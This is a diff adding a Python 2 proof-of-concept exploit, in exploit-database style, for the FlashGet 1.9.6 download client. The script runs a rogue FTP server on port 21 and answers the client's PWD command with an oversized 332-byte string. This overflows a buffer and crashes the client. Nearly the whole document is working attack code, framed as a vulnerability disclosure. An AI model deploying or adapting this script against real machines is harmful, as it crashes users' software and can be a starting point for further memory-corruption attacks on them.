@@ -1,0 +1,54 @@
+# Exploit Title: FlashGet 1.9.6 - Denial of Service (PoC)
+# Date: 2020-05-02
+# Author: Milad Karimi
+# Testen on: Kali Linux
+# Software Link: http://www.flashget.com/en/download.htm?uid=undefined
+# Version: 1.9.6
+# CVE : N/A
+
+#!/usr/bin/python
+
+from time import sleep
+from socket import *
+
+res = [
+    '220 WELCOME!! :x\r\n',
+    '331 Password required for %s.\r\n',
+    '230 User %s logged in.\r\n',
+    '250 CWD command successful.\r\n',
+    '257 "%s/" is current directory.\r\n' # <-- %s B0f :x
+    ]
+
+buf = 'A' * 332
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind(('0.0.0.0', 21))
+s.listen(1)
+print '[+] listening on [FTP] 21 ...\n'
+c, addr = s.accept()
+c.send(res[0])
+
+user = ''
+
+for i in range(1, len(res)):
+    req = c.recv(1024)
+    print '[*][CLIENT] %s' % (req)
+    tmp = res[i]
+    if(req.find('USER') != -1):
+        req = req.replace('\r\n', '')
+        user = req.split('\x20', 1)[1]
+        tmp %= user
+    if(req.find('PASS') != -1):
+        tmp %= user
+    if(req.find('PWD') != -1):
+        tmp %= buf    
+    print '[*][SERVER] %s' % (tmp)    
+    c.send(tmp)
+
+sleep(5)
+c.close()
+s.close()
+
+print '[+] DONE'
+ 
+# Discovered By : Milad Karimi
